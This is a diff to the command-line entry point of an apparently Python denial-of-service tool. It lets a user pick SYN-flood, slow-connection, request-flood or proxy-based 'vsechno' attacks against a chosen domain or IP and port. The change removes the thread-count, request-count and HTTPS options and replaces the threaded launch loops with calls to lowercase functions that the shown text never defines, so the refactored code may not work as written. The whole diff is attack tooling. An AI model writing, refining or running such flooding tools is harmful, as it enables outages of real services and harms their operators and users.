@@ -357,83 +357,28 @@ class Vsechno:
             t.join()
 
 def main():
+    # Parse arguments
     parser = ArgumentParser(description=title, formatter_class=RawTextHelpFormatter)
     parser.add_argument('-d', '--domain', dest='d', help='Domain/IP address to flood', required=True)
     parser.add_argument('-p', '--port', dest='p', help='Port number (default: 80)', default=80, type=int)
-    parser.add_argument('-t', '--threads', dest='t', help='Number of threads (default: 100)', default=100, type=int)
     parser.add_argument('-T', '--timeout', dest='T', help='Socket timeout (default: 1)', default=1, type=int)
     parser.add_argument('-s', '--sleep', dest='s', help='Sleep time between requests (default: 0)', default=0, type=int)
     parser.add_argument('-m', '--method', dest='m', help='Attack method (default: syn)', choices=['pyslow', 'requester', 'syn', 'vsechno'], default='syn')
-    parser.add_argument('-r', '--request', dest='r', help='Number of requests to send (default: infinite)', type=int)
-    parser.add_argument('-H', '--https', dest='H', action='store_true', help='Use HTTPS for the attack (default: HTTP)')
     parser.add_argument('-P', '--proxy-file', dest='P', help='File containing proxy list')
-    
-    # Remove the conflicting option for help
-    # parser.add_argument('-h', '--help', action='help', help='show this help message and exit')
-    
+
     args = parser.parse_args()
 
+    # Call the function responsible for flooding
     if args.m == 'syn':
-        if not args.d:
-            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
-        print(colored('\n[+] Loading Synflood', 'blue'))
-        for x in range(args.t):
-            try:
-                synflood = Synflood(args.d, check_tgt(args), 1)
-                synflood.start()
-                print(colored(f'\n[+] Running Synflood on {args.d}', 'green'))
-            except KeyboardInterrupt:
-                sys.exit(cprint('[-] Canceled by user', 'red'))
-            except Exception as e:
-                print(e)
-
+        synflood(args.d, args.p, args.T, args.s, args.P)
     elif args.m == 'pyslow':
-        if not args.d:
-            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
-        print(colored('\n[+] Loading Pyslow', 'blue'))
-        for x in range(args.t):
-            try:
-                pyslow = Pyslow(args.d, args.p, args.T, args.t, args.s)
-                pyslow.doconnection()
-                print(colored(f'\n[+] Running Pyslow on {args.d}', 'green'))
-            except KeyboardInterrupt:
-                sys.exit(cprint('[-] Canceled by user', 'red'))
-            except Exception as e:
-                print(e)
-
+        pyslow(args.d, args.p, args.T, args.s, args.P)
     elif args.m == 'requester':
-        if not args.d:
-            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
-        print(colored('\n[+] Loading Requester', 'blue'))
-        for x in range(args.t):
-            try:
-                requester = Requester(args.d)
-                requester.start()
-                print(colored(f'\n[+] Running Requester on {args.d}', 'green'))
-            except KeyboardInterrupt:
-                sys.exit(cprint('[-] Canceled by user', 'red'))
-            except Exception as e:
-                print(e)
-
+        requester(args.d, args.p, args.T, args.s, args.P)
     elif args.m == 'vsechno':
-        if not args.d:
-            sys.exit(cprint('[-] Can\'t resolve host: Unknown host!', 'red'))
-        print(colored('\n[+] Loading Vsechno', 'blue'))
-        if args.P:
-            vsechno = Vsechno(args.T, args.t, args.P, args.d, args.H)
-        else:
-            sys.exit(cprint('[-] You must provide a proxy file for this method', 'red'))
-        try:
-            vsechno.start()
-            print(colored(f'\n[+] Running Vsechno on {args.d}', 'green'))
-        except KeyboardInterrupt:
-            sys.exit(cprint('[-] Canceled by user', 'red'))
-        except Exception as e:
-            print(e)
-
+        vsechno(args.d, args.p, args.T, args.s, args.P)
     else:
         sys.exit(parser.print_help())
-
 
 if __name__ == '__main__':
     main()
